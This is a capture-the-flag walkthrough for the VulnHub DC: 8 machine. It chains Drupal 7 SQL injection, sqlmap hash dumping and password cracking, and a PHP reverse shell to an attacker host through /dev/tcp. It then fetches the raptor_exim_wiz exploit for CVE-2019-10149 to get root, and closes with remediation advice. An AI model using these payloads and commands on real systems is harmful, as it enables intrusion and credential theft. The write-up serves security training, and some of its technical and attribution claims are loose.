# DC: 8 — SQLi to Exim: The Two CVE Combo

DC: 8 delivers a clean two-phase chain, dude. First: SQL injection in a Drupal 7 `nid` parameter that hands you the user table with password hashes. Crack the hash, log in as john with his "turtle" password (no cap, not the strongest choice), abuse the PHP text filter to pop a shell as www-data. Then the elegant part: Exim 4.89 SUID binary sitting right there, vulnerable to CVE-2019-10149 (Return of the WIZard), which gives you root. Two CVEs, clean execution, real lessons about CMS hardening and mail server privilege.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | DC: 8 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-8,367/ |
| **Techniques** | SQL injection (Drupal nid parameter), sqlmap database dump, hash cracking (John the Ripper), Drupal PHP Filter module RCE, Exim 4.89 SUID LPE |
| **CVEs** | CVE-2019-10149 (Exim 4.89 local privilege escalation, "Return of the WIZard") |
| **APT Groups** | APT41 (exploits CMS SQL injection for credential theft and RCE in enterprise web applications); OilRig (APT34) (uses mail server vulnerabilities including Exim LPE for privilege escalation on compromised Linux hosts) |

---

## Attack Summary

```
[netdiscover] → [nmap: port 80 Drupal 7, port 22 SSH]
    → [browse: /?nid=1 → SQL error on /?nid=1']
    → [sqlmap: d7db → users table → john hash]
    → [john --wordlist=rockyou.txt → john:turtle]
    → [Drupal login as john:turtle]
    → [Configuration → Text formats → Full HTML → enable PHP filter]
    → [edit content → PHP code format → Bash TCP reverse shell]
    → [nc listener → shell as www-data]
    → [python3 pty upgrade]
    → [find SUID: /usr/sbin/exim4]
    → [exim --version → 4.89]
    → [wget raptor_exim_wiz.sh to /tmp]
    → [./raptor_exim_wiz.sh -m netcat → root shell]
    → [cat /root/flag.txt → FLAG]
```

---

## Methodology

1. Network discovery and port scanning (Nmap)
2. Web recon: Drupal 7, URL parameter testing for injection
3. SQL injection identification and exploitation with sqlmap
4. Hash extraction and cracking with John the Ripper
5. Drupal login and PHP text filter enablement
6. PHP reverse shell via content node
7. Shell stabilization
8. SUID enumeration and Exim version identification
9. CVE-2019-10149 exploitation with raptor_exim_wiz
10. Root flag capture

---

## Step 1 — Host Discovery and Port Scanning

```bash
netdiscover -r 192.168.1.0/24
```

Note the target IP. Full aggressive scan:

```bash
nmap -A <TARGET_IP>
```

Expected output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x (Debian)
80/tcp open  http    Apache httpd 2.4.x
| http-generator: Drupal 7
```

Key finding: Drupal 7 on port 80. Drupal 7 reached end-of-life in January 2025, but many installations remain unpatched on production systems. The `nid` parameter in Drupal 7 content nodes is a well-known SQL injection entry point.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SQL Injection Discovery

Browse to `http://<TARGET_IP>/`. The navigation links include `?nid=` parameters. Test with a single quote:

```
http://<TARGET_IP>/?nid=1'
```

A Drupal database error is returned:

```
PDOException: SQLSTATE[42000]: Syntax error or access violation
```

SQL injection confirmed. The `nid` parameter is passed directly to the database query without sanitization.

**Why does this matter in the real world?** SQL injection in CMS platforms (Drupal, WordPress, Joomla) is still a top attack vector. APT41 was documented exploiting Drupal SQL injection (CVE-2018-7600 and related) in 2019 intrusions targeting healthcare and government organizations. The user table in Drupal contains salted password hashes for all CMS accounts — a direct path to admin access.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1190 — SQL Injection

---

## Step 3 — Database Enumeration with sqlmap

```bash
sqlmap -u "http://<TARGET_IP>/?nid=1" --dbs --risk 3 --level 5 --batch
```

The `d7db` database is found. Dump the users table:

```bash
sqlmap -u "http://<TARGET_IP>/?nid=1" -D d7db -T users --dump --risk 3 --level 5 --batch
```

Two password hashes are extracted. Save them to a file:

```bash
echo '$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z' > hashes.txt
```

Crack with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Result:

```
turtle           (john)
```

Credential: `john:turtle`

**Real-world note:** Drupal password hashes use Drupal's portable PHP password hashing framework (phpass). They are salted SHA-512 with 65536 iterations by default, making offline cracking slower than unsalted MD5/SHA1, but "turtle" is in the top 200K passwords in rockyou.txt, so it falls quickly regardless of the algorithm.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking; T1005 — Data from Local System

---

## Step 4 — Drupal Login and PHP Filter Enablement

Navigate to `http://<TARGET_IP>/user` and log in with `john:turtle`.

Enable PHP code execution through text formats:

1. Go to **Configuration > Content authoring > Text formats**.
2. Edit the "Full HTML" format.
3. Under **Text format** filters, enable the **PHP evaluator** filter.
4. Save the format configuration.

Now any content node using "Full HTML" format will execute PHP embedded in the body.

**MITRE ATT&CK:** T1078 — Valid Accounts; T1505.003 — Server Software Component: Web Shell

---

## Step 5 — PHP Reverse Shell via Content Node

Navigate to any existing content node and edit it:

1. Change the text format to **PHP code** (or Full HTML with PHP filter enabled).
2. Replace the body with a PHP reverse shell payload:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
?>
```

Replace `<LHOST>` with your Kali IP and `<LPORT>` with your listener port (e.g., 4444).

Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

Save or preview the node. The PHP executes when the page is rendered, delivering a `www-data` shell.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell; T1190 — Exploit Public-Facing Application

---

## Step 6 — Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
```

You are now `www-data` with a stable interactive shell.

---

## Step 7 — SUID Enumeration and Exim Version Check

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Expected interesting output:

```
/usr/sbin/exim4
```

Check the Exim version:

```bash
exim --version
# or
/usr/sbin/exim4 --version
```

```
Exim version 4.89
```

Exim 4.89 is vulnerable to CVE-2019-10149, known as "Return of the WIZard." This is a local privilege escalation when Exim runs as root (which it does when SUID) — specifically, it exploits the `${run{...}}` expansion in the `MAIL FROM` command to execute arbitrary commands as root.

**Real-world note:** CVE-2019-10149 was discovered by Qualys in June 2019 and affects all Exim versions from 4.87 to 4.91. The vulnerability allows local users (and in some configurations, remote unauthenticated attackers) to execute arbitrary commands as root. Multiple hosting providers and managed server environments were affected. OilRig (APT34) has been documented targeting Linux mail servers including Exim for post-exploitation privilege escalation.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 8 — Privilege Escalation via CVE-2019-10149 (raptor_exim_wiz)

Download the exploit to `/tmp` on the target (from www-data shell):

```bash
wget https://raw.githubusercontent.com/AV1080p/Hackthebox-Writeups/master/raptor_exim_wiz.sh \
  -O /tmp/raptor_exim_wiz.sh
chmod +x /tmp/raptor_exim_wiz.sh
```

Alternatively, host the exploit on the attacker machine and wget from there:

```bash
# On attacker (in the exploit directory):
python3 -m http.server 8080

# On target:
wget http://<ATTACKER_IP>:8080/raptor_exim_wiz.sh -O /tmp/raptor_exim_wiz.sh
chmod +x /tmp/raptor_exim_wiz.sh
```

Start a root shell listener on the attacker machine:

```bash
nc -lvnp 9001
```

Run the exploit with the netcat payload mode:

```bash
/tmp/raptor_exim_wiz.sh -m netcat
```

The exploit sends a crafted `MAIL FROM` with `${run{...}}` expansion to the local Exim process. When the SUID Exim processes it, it executes the embedded command as root. A root shell connects back to your listener.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ Root via CVE-2019-10149. GG.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Step 9 — Root Flag

```bash
cat /root/flag.txt
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Drupal password hash | `$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z` | sqlmap dump of d7db.users | John the Ripper → john:turtle |
| Drupal credential | john:turtle | Hash cracking | Drupal admin login |
| Web shell user | www-data | Drupal PHP Filter RCE | Shell access |
| Root flag | (contents of `/root/flag.txt`) | `/root/flag.txt` | Read as root via CVE-2019-10149 |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SQL injection in Drupal nid parameter | CMS SQL injection has been in APT41 playbooks since 2017; Drupal 7 EOL installations are consistently found in enterprise networks | Keep CMS platforms patched; upgrade from EOL Drupal 7; use WAF rules for SQLi patterns |
| 2 | PHP text filter enables RCE via content | Any admin-accessible PHP execution feature in a CMS is equivalent to a webshell; it should never exist on production | Disable PHP text filters permanently; use Twig/Jinja for templating; audit CMS text format configurations |
| 3 | Weak password "turtle" cracked from hash dump | Salted phpass hashes still fall to dictionary attacks when weak passwords are used; the hash algorithm does not compensate for password quality | Enforce strong password policies (12+ chars, mixed case, symbols); use HIBP integration for new password checks |
| 4 | Exim 4.89 SUID vulnerable to CVE-2019-10149 | CVE-2019-10149 was actively exploited in the wild; Exim is widely deployed on Linux hosts as the default MTA on Debian/Ubuntu | Patch Exim to ≥4.92; audit SUID binaries monthly: `find / -perm -u=s -type f 2>/dev/null`; remove SUID from mail servers that do not require it |
| 5 | Drupal 7 EOL | Drupal 7 reached EOL in January 2025; many systems remain unpatched; EOL software accumulates unpatched CVEs rapidly | Enforce a software lifecycle policy; track EOL dates for all CMS platforms; migrate to supported versions |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Collection | Collection | Data from Local System | T1005 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Upgrade Drupal** from EOL 7.x to a supported release; apply all security patches immediately
2. **Parameterize the nid query** — Drupal core updates address this; for custom code, use prepared statements
3. **Disable PHP text filter permanently** in all Drupal text format configurations; use Twig for templating
4. **Enforce strong password policy** for all CMS accounts: minimum 12 characters, mixed case, symbols; integrate HIBP checking
5. **Upgrade Exim to ≥4.92** to remediate CVE-2019-10149; remove SUID from Exim if local delivery as root is not required
6. **Restrict outbound connections** from the web server process with iptables/ufw: block unexpected reverse shells
7. **Rotate the john account credentials** and audit all other CMS accounts for weak passwords

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all CMS versions; track EOL dates; audit SUID binaries |
| Protect | Access Control | Enforce strong passwords; disable PHP text filter; restrict Exim SUID |
| Protect | Data Security | Parameterize database queries; prevent SQL injection at code level |
| Detect | Anomalies and Events | Alert on Drupal database errors (SQLi indicators); monitor SUID Exim executions via auditd |
| Respond | Response Planning | Rotate all CMS credentials; patch Drupal and Exim; remove PHP filter configuration |
| Recover | Recovery Planning | Restore Drupal from clean backup; audit all CMS accounts and text format configurations |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Parameterize nid and all Drupal URL parameters; WAF rules for SQLi patterns |
| SI-2 | Flaw Remediation | Patch Drupal and Exim; enforce software lifecycle policy with EOL tracking |
| AC-6 | Least Privilege | Remove Exim SUID if not required; restrict CMS admin roles to necessary users |
| IA-5 | Authenticator Management | Enforce password complexity; HIBP integration; regular password rotation for privileged accounts |
| CM-7 | Least Functionality | Disable PHP text filter; remove Exim SUID; disable unused Drupal modules |

### CISA KEV

CVE-2019-10149 (Exim "Return of the WIZard" local privilege escalation) was added to the CISA Known Exploited Vulnerabilities catalog. CISA mandates federal agencies patch this vulnerability and strongly recommends all organizations apply the fix. Organizations using Drupal 7 should also reference CISA AA22-074A regarding CMS exploitation patterns used by APT actors.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Vulnerability and Threat Management (THREAT) | Patch and Remediate Vulnerabilities (Drupal EOL, Exim CVE-2019-10149) | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory (CMS versions, SUID binaries) | MIL2 |
| Identity and Access Management (IAM) | Manage Passwords and Credentials (strong CMS passwords; no weak defaults) | MIL2 |

### MITRE D3FEND

- **D3-SFA** (Software Feature Analysis): detect PHP text filter enabled in CMS text format configurations
- **D3-UAP** (User Account Permissions): restrict Exim SUID; enforce least privilege for mail server process
- **D3-ACH** (Application Configuration Hardening): enforce Drupal hardening guides; disable dangerous text formats

---

## Final Thoughts

DC: 8 is a great two-act machine. The first act (SQLi to hash to CMS login) is a classic chain that appears in real assessments against unpatched Drupal installations regularly. The second act (Exim 4.89 SUID to CVE-2019-10149) is a legit CVE with real-world history: it was actively exploited in campaigns shortly after disclosure, and Exim is the default MTA on Debian-based systems, meaning it appears on more Linux servers than most admins realize.

The combination teaches a valuable mindset: when you land a low-privilege shell, enumerate every SUID binary and check each one against CVE databases before assuming manual exploitation is needed. Sometimes a public exploit drops root in seconds.

No cap, "turtle" as a password for a sysadmin account is fr fr a problem.

Thanks guys!! (❍ᴥ❍ʋ)
